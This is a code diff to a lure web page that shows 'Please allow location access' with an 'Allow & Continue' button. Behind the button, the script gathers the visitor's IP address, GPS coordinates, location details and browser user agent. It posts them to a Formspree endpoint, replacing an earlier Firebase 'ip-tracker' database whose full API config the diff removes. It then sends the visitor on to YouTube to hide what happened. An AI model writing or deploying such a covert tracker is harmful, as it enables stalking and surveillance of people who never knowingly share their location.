@@ -7,10 +7,6 @@
     body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
     button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
   </style>
-
-  <!-- Firebase CDN -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
 </head>
 <body>
   <h2>📍 Please allow location access</h2>
@@ -18,21 +14,6 @@
   <button onclick="startTracking()">Allow & Continue</button>
 
   <script>
-    // ✅ Your Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyD7-mS804xPfoS8pJnboMpsbZGFrHEIcVk",
-      authDomain: "ip-tracker-d63e1.firebaseapp.com",
-      projectId: "ip-tracker-d63e1",
-      storageBucket: "ip-tracker-d63e1.appspot.com",
-      messagingSenderId: "978015386276",
-      appId: "1:978015386276:web:418573d8546b922b974431",
-      measurementId: "G-SZB4ZMG0V3"
-    };
-
-    // ✅ Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
     async function getGeoCoords() {
       return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -56,7 +37,7 @@
 
     async function startTracking() {
       try {
-        // Get IP
+        // IP
         const ipRes = await fetch('https://api64.ipify.org?format=json');
         const ipJson = await ipRes.json();
         const ip = ipJson.ip;
@@ -78,17 +59,20 @@
           timezone: locData.timezone || 'N/A',
           latitude: gps.latitude,
           longitude: gps.longitude,
-          user_agent: navigator.userAgent,
-          timestamp: new Date().toISOString()
+          user_agent: navigator.userAgent
         };
 
-        // ✅ Send to Firebase
-        await db.ref("visitors").push(data);
+        // Send to Formspree
+        await fetch("https://formspree.io/f/mldnbqvo", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
 
       } catch (err) {
         console.error("Tracking error:", err);
       } finally {
-        window.location.href = "https://youtube.com";
+        window.location.href = "https://youtube.com"; // ✅ redirect works
       }
     }
   </script>
